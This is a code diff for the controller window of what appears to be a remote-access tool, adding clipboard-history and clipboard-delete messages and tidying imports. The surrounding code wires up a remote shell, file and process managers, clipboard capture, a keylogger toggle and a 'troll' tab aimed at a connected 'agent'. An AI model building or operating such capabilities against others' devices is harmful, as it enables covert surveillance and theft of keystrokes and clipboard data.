@@ -3,11 +3,13 @@ import os
 import json
 import time
 import struct
+import asyncio
 from PyQt6.QtWidgets import (QMainWindow, QToolBar, QMessageBox, QWidget, 
                              QVBoxLayout, QHBoxLayout, QTextEdit, QPushButton,
                              QLabel, QFrame, QToolButton, QTabWidget)
 from PyQt6.QtGui import QAction, QPixmap
 from PyQt6.QtCore import Qt
+import base64
 
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
@@ -25,6 +27,7 @@ from viewer.clipboard_tab import ClipboardTab
 from viewer.settings_tab import SettingsTab
 from viewer.troll_tab import TrollTab
 from core import protocol
+from core.network import send_msg
 
 SETTINGS_FILE = "capture_settings.json"
 
@@ -160,14 +163,26 @@ class SessionWindow(QMainWindow):
         self.worker.connection_ready.connect(self._on_connected)
         self.worker.device_error.connect(self.on_device_error)
         
-        # Tab data signals
+        # Tab data signals - use default AutoConnection (Qt decides based on thread)
         self.worker.shell_output.connect(self.shell_tab.append_output)
         self.worker.shell_exit.connect(self.shell_tab.show_exit_code)
-        self.worker.shell_cwd.connect(self.shell_tab.update_cwd) # Connect CWD Signal
+        self.worker.shell_cwd.connect(self.shell_tab.update_cwd)
         self.worker.pm_data.connect(self.pm_tab.update_data)
         self.worker.fm_data.connect(self.fm_tab.update_data)
         self.worker.clipboard_data.connect(self.clipboard_tab.update_content)
+        self.worker.clipboard_history.connect(self.clipboard_tab.update_history)
+        self.worker.clipboard_entry.connect(self.clipboard_tab.add_entry)
         self.worker.sysinfo_data.connect(self.device_settings_tab.update_sysinfo)
+        
+        # Clipboard tab outgoing signals
+        self.clipboard_tab.get_history_signal.connect(
+            lambda: self.worker.send_msg(bytes([protocol.OP_CLIP_HISTORY_REQ]))
+        )
+        self.clipboard_tab.delete_entry_signal.connect(
+            lambda idx: self.worker.send_msg(
+                bytes([protocol.OP_CLIP_DELETE]) + json.dumps({"index": idx}).encode('utf-8')
+            )
+        )
         
         # Connection Dialog (blocks until connected)
         self.conn_dialog = ConnectionDialog(target_id or target_url, self)
@@ -402,6 +417,7 @@ class SessionWindow(QMainWindow):
             dy = max(-32768, min(32767, dy))
             payload = struct.pack('!hh', dx, dy)
             self.send_command(protocol.OP_SCROLL, payload)
+
     def toggle_keylog(self, checked):
         if checked:
             self.keylog_widget.show()
@@ -511,9 +527,6 @@ class SessionWindow(QMainWindow):
             json.dump(self.capture_settings, f)
 
     def send_command(self, opcode, payload=b''):
-        import asyncio
-        from core.network import send_msg
-        
         try:
             if self.worker.loop and self.worker.ws:
                 asyncio.run_coroutine_threadsafe(
@@ -561,7 +574,6 @@ class SessionWindow(QMainWindow):
     
     def upload_file(self, remote_path, data):
         """Upload file to agent."""
-        import base64
         payload = json.dumps({
             'path': remote_path,
             'data': base64.b64encode(data).decode('ascii')
